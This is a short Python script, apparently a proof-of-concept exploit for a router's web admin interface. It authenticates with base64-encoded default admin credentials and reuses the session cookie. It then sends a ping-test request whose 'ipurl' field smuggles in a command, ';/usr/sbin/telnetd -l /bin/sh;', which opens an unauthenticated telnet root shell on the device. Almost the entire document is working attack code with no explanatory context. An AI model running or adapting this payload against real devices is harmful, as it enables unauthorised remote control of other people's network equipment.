import requests
import json

url1 = 'http://192.168.1.1/cgi-bin/login.cgi'
data1 = {"username":"YWRtaW4%3D","password":"YWRtaW4%3D","token":"","source":"web","cn":"","action":"auth"} # password is default password

response1 = requests.post(url1, data=json.dumps(data1))
print(response1.text)

url = 'http://192.168.1.1/API/info'
headers = {
    'Host': '192.168.1.1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
    'Content-Type': 'application/json',
    'Origin': 'http://192.168.1.1',
    'Referer': 'http://192.168.1.1/idp/idp_ping.html',
    'Cookie': response1.headers['Set-Cookie'].split(" ")[0],
}
data = {
    'pingTest': {
        'ipurl': '192.168.1.1;/usr/sbin/telnetd -l /bin/sh;',
        'pkgsize': '32',
        'count': '5'
    }
}

response = requests.post(url, headers=headers, data=json.dumps(data))
print(response.text)
